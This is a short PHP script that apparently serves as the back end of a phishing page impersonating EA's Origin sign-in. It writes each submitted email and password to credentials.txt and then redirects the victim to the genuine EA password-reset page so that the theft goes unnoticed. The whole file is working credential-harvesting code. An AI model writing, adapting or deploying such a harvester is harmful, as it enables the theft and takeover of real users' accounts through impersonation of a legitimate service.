<?php

file_put_contents("credentials.txt", "[+] Origin -> Usuario: " . $_POST['email'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://signin.ea.com/p/originX/resetPassword?execution=e1430406479s1');
exit();
?>
